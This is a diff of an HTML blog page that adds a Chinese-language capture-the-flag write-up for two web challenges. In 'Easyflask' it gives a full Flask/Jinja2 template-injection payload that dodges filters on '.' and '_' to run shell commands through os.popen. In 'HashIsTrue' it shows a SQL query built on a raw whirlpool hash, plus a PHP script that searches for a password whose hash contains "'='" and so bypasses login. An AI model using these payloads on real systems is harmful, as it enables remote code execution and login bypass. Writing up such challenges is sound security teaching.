@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-28</span>
-            <span class="time">06:26:35</span>
+            <span class="time">06:38:51</span>
           </span>
           
         </div>
@@ -108,7 +108,33 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <h1 id="Easyflask"><a href="#Easyflask" class="headerlink" title="Easyflask"></a>Easyflask</h1><p>第一次遇到这题有点懵,看到提示是flask,应该是flask模版注入<br><img src="https://img-blog.csdnimg.cn/20200228192125894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="1"><br>flask模版就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式<br>我们首先测验一下/</p>
+          <h1 id="Easyflask"><a href="#Easyflask" class="headerlink" title="Easyflask"></a>Easyflask</h1><p>第一次遇到这题有点懵,看到提示是flask,应该是flask模版注入<br><img src="https://img-blog.csdnimg.cn/20200228192125894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="1"><br>flask模版就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式<br>我们首先测验一下/,发现有回显,再看下响应头,有python的显示<br><img src="https://img-blog.csdnimg.cn/20200228192730212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="2"><br>下面直接介绍一种payload是颖奇师傅介绍的</p>
+<pre><code class="hljs undefined">http://183.129.189.60:10000/&#123;&#123;()|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x1'</span>])|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x2'</span>])|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x3'</span>])()|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x4'</span>])(233)|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x5'</span>])|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x6'</span>])|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x4'</span>])(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x7'</span>])|attr(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x4'</span>])(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x8'</span>])(request[<span class="hljs-string">'args'</span>][<span class="hljs-symbol">'x9'</span>])&#125;&#125;?x1=<span class="hljs-strong">__class__</span>&amp;x2=<span class="hljs-strong">__base__</span>&amp;x3=<span class="hljs-strong">__subclasses__</span>&amp;x4=<span class="hljs-strong">__getitem__</span>&amp;x5=<span class="hljs-strong">__init__</span>&amp;x6=<span class="hljs-strong">__globals__</span>&amp;x7=<span class="hljs-strong">__builtins__</span>&amp;x8=eval&amp;x9=<span class="hljs-strong">__import__</span>("os").popen('想要执行的命令').read()</code></pre>
+
+<p>因为这里过滤了.和_<br>对于过滤.，可以用中括号括起来或者用attr()、getattr()绕过<br>对于过滤_，可以用request[‘arg’]绕过，<br>直接执行cat /flag</p>
+<h1 id="HashIsTrue"><a href="#HashIsTrue" class="headerlink" title="HashIsTrue"></a>HashIsTrue</h1><p>给了 hint</p>
+<pre><code class="hljs undefined">&lt;?php
+<span class="hljs-variable">$ps</span> = mysql_real_escape_string(<span class="hljs-variable">$ps</span>);
+<span class="hljs-variable">$ps</span> = <span class="hljs-built_in">hash</span>(<span class="hljs-string">"whirlpool"</span>,<span class="hljs-variable">$ps</span>, <span class="hljs-literal">true</span>);
+<span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-string">"select * from users where user_id='<span class="hljs-variable">$id</span>' and user_ps='<span class="hljs-variable">$ps</span>'"</span>);
+?&gt;</code></pre>
+
+<p><img src="https://img-blog.csdnimg.cn/20200228193744641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="3"></p>
+<p>一开始想到sql注入,但是有验证码没法爆破<br>下面了解到一种方法<br>需了解当 mysql 比较 password=‘a’时结果为假，但是当比较 password=‘a’=‘b’时，结果为真<br>需了解 php 的 hash 加密过程中，当 hash 函数使用 whirlpool 加密且给了 true 参数，那么加密后的字符串中,是一对二进制有可能会出现字符<br>可能会出现如 ‘=’这样的三个连续的字符,结果导致注入<br>写脚本</p>
+<pre><code class="hljs undefined"><span class="hljs-variable">$i</span>=1;
+<span class="hljs-variable">$str</span>= <span class="hljs-string">"'='"</span>;
+<span class="hljs-keyword">while</span>(1)
+&#123;
+	<span class="hljs-variable">$ps</span>=<span class="hljs-built_in">hash</span>(<span class="hljs-string">"whirlpool"</span>,<span class="hljs-variable">$i</span>,<span class="hljs-literal">true</span>);
+	<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$ps</span>,<span class="hljs-variable">$str</span>))
+	&#123;
+		<span class="hljs-built_in">break</span>;
+	&#125;
+	<span class="hljs-variable">$i</span>++;
+&#125;
+<span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>;//需要跑好久</code></pre>
+
+<p>账号admin 密码跑出来就可</p>
 
         </div>
       </div>
